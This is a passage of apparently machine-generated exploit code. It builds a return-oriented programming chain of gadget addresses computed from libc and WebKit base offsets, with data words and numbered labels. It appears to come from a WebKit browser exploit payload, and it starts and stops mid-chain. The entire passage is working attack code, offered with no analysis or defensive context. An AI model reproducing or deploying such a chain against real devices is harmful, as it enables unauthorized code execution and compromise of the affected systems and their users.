set_gadget(libc_base+793877,); //pop rsi
//L636:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+90648, //L639
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90632, //L637
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L639:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90792, //L642
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90760, //L640
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90776, //L641
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90864, //L643
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L643:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90920, //L645
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L645:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91000, //L649
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L649:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L647:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L648:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+91104, //L650
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+91120, //L651
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+91208, //L652
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L652:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91264, //L654
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L654:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91336, //L656
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91392, //L658
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L658:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91480, //L660
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L660:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L662:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91600, //L665
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91584, //L663
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91744, //L668
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91712, //L666
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91728, //L667
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+91824, //L669
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L669:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L671:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91944, //L674
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91928, //L672
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92088, //L677
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92056, //L675
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92072, //L676
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92160, //L678
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92216, //L680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L680:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92296, //L684
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L684:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L682:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L683:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+92400, //L685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+92416, //L686
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+92504, //L687
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92560, //L689
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L689:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92632, //L691
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92688, //L693
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L693:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L695:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92824, //L696
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L696:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L698:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+92944, //L701
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92928, //L699
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L701:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93088, //L704
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93056, //L702
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93072, //L703
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93160, //L705
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L705:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+93216, //L707
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L707:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93296, //L711
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L711:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L709:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L710:
db([9, 0]); // 0x9
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+93400, //L712
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+93416, //L713
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+93504, //L714
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93560, //L716
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L716:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93632, //L718
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93688, //L720
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L720:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93776, //L722
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L722:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L724:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+93896, //L727
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93880, //L725
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L725:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94040, //L730
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94008, //L728
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94024, //L729
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94112, //L731
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L731:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94168, //L733
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L733:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94248, //L737
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L737:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L735:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L736:
db([6, 0]); // 0x6
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+94352, //L738
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+94368, //L739
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+94456, //L740
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94512, //L742
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L742:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94616, //L744
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L744:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L746:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+94736, //L749
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94720, //L747
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L747:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L749:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94880, //L752
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94848, //L750
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94864, //L751
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94952, //L753
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L753:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95008, //L755
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L755:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95088, //L759
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L759:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L757:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L758:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+95192, //L760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+95208, //L761
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+95296, //L762
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L762:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95352, //L764
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L764:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95424, //L766
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95480, //L768
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L768:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L770:
webkit_base+14461559, //mov [rax], rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95616, //L771
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L771:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L773:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+95736, //L776
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95720, //L774
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95880, //L779
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95848, //L777
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95864, //L778
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95952, //L780
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L780:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96008, //L782
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L782:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96088, //L786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L786:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L784:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L785:
db([11, 0]); // 0xb
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+96192, //L787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+96208, //L788
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+96296, //L789
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L789:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96352, //L791
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L791:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96424, //L793
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L793:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96480, //L795
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L795:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L797:
libc_base+272260, //mov rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96616, //L798
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L798:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L800:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+96736, //L803
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96720, //L801
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L801:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L803:
db([0, 0]); // 0x0
set_gadgets([
